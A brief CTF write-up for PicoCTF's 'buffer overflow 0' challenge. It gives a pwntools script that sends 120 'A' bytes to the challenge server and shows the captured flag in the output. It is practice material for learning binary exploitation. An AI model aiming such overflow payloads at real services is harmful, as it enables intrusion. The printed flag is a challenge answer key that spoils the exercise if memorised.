# Retos PicoCTF


## Objetivo 
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c).

Additional details will be available after launching your challenge instance.
## Solución 

```
┌──(kali㉿kali)-[~/picoCTF/retos-resueltos/binexp/bufferoverflow0]
└─$ python3 exp.py      
[+] Opening connection to saturn.picoctf.net on port 53042: Done
b'Input: '
[+] Receiving all data: Done (43B)
[*] Closed connection to saturn.picoctf.net port 53042
b'picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}\n'


from pwn import *


p = remote('saturn.picoctf.net',53042)

print( p.recv())

overflow = b'A'*120

p.sendline(overflow)

print(p.recvall())


```

## Notas adicionales 

## Referencias 
